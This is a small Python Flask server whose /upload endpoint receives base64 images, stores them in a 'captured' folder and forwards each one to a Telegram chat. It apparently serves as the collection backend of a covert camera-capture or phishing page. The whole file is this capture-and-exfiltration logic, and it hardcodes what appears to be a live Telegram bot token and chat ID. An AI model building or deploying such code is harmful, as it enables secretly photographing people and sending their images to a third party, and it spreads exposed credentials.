from flask import Flask, request
import os
import base64
import requests
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = "7912894287:AAHuWV6vj4ZSAYGwPH2UNMSL0XmKzwr3JSY"
CHAT_ID = "7167361126"
CAPTURE_DIR = "captured"
os.makedirs(CAPTURE_DIR, exist_ok=True)

def send_to_telegram(image_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(image_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': CHAT_ID}
        requests.post(url, data=data, files=files)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if 'image' in data:
        img_data = data['image'].split(',')[1]
        img_bytes = base64.b64decode(img_data)
        filename = f"img_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        filepath = os.path.join(CAPTURE_DIR, filename)

        with open(filepath, 'wb') as f:
            f.write(img_bytes)

        send_to_telegram(filepath)
        return '✅ Image received', 200

    return '❌ No image data', 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
